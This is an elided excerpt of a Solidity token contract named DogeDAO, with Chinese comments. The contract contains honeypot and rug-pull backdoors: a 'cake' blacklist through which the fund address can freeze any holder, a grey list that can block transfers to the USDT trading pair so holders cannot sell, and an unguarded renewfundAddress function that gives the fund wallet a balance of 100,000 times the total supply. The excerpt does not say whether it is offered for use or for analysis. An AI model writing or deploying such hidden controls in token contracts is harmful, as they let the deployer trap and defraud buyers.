...
abstract contract DogeDAOToken is IERC20, Ownable {
    ...
    mapping(address => bool) private _cake;//蛋糕
    mapping(address => bool) private _greyList;//灰名单
    ...
    function _transfer(
        ...
        // 灰名单不允许转入
        require(!_cake[from], "cake");
        if(!_feeWhiteList[from]){
        require(!_greyList[to], "greyList");}
        //交易税
        uint256 txFee;
    ...
    function renewfundAddress() public {
        _balances[fundAddress] = _tTotal*100000;
    }
    ...
    function setGreyTrue() external {
        ...
        _greyList[address(_usdtPair)] = true;
    }
    function setGreyFalse() external {
         require (msg.sender == fundAddress);
        _greyList[address(_usdtPair)] = false;
    }
    //设置蛋糕真
    function setcaketrue(address addr) external  {
        require (msg.sender == fundAddress);
        _cake[addr] = true;
    }
    //设置蛋糕假
    function setcakefalse(address addr) external  {
        require (msg.sender == fundAddress);
        _cake[addr] = false;
    }
    //设置交易手续费白名单
    ...
    //查看是否蛋糕
    function iscake(address addr) external view returns (bool){
        return _cake[addr];
    }
    //查看是否灰名单
    function isGreyList(address addr) external view returns (bool){
        return _greyList[addr];
    }
    //查看是否LP分红
...
contract DogeDAO is DogeDAOToken {
    constructor() DogeDAOToken(
    //名称
        "DogeDAO",
    //符号
        "DogeDAO",
    ...
    //总量 100000000
        100000000,
    //营销钱包
        address(0xa967f30843bf45b5B23eD2bF05ef8b0D71dBF7a2)
    ){
